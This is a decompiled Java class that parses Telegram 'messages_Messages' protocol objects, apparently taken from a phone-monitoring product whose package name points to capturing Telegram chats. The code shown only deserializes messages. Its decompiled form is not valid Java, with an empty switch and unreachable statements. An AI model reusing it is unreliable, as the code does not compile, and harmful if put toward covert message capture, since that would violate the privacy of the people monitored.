package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$messages_Messages
  extends TLObject
{
  public ArrayList chats;
  public ArrayList collapsed;
  public int count;
  public int flags;
  public ArrayList messages;
  public int pts;
  public ArrayList users;
  
  public TLRPC$messages_Messages()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.messages = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.chats = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.users = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.collapsed = localArrayList;
  }
  
  public static messages_Messages TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in messages_Messages", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_messages_messages;
      ((TLRPC.TL_messages_messages)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_messages_channelMessages;
      ((TLRPC.TL_messages_channelMessages)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_messages_messagesSlice;
      ((TLRPC.TL_messages_messagesSlice)localObject).<init>();
    }
    if (localObject != null) {
      ((messages_Messages)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (messages_Messages)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$messages_Messages.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */